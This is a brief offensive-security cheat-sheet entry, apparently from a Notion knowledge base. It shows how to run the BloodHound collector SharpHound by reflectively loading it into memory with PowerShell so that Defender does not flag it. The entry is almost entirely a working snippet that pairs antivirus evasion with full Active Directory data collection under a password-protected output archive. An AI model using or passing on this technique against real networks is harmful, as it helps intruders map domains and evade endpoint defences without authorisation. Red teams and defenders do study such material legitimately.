# bloodhound/sharphound: reflectively load if flagged by defender

OS: Windows
Description: Sharphound: Load reflectively to bypass AV
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), bloodhound (https://www.notion.so/bloodhound-1474c8e52376807c8400efeed991bc37?pvs=21)

```php
# Load the C# assembly into memory, add the desired flags, execute
$sh = [System.Reflection.Assembly]::Load([byte[]]([IO.FIle]::ReadAllBytes("C:\Temp\SharpHound.exe")));
$cmd = "-c All --zippassword 'p@ssw0rd' --outputprefix REFLECTED"
[Sharphound.Program]::Main($cmd.Split())
```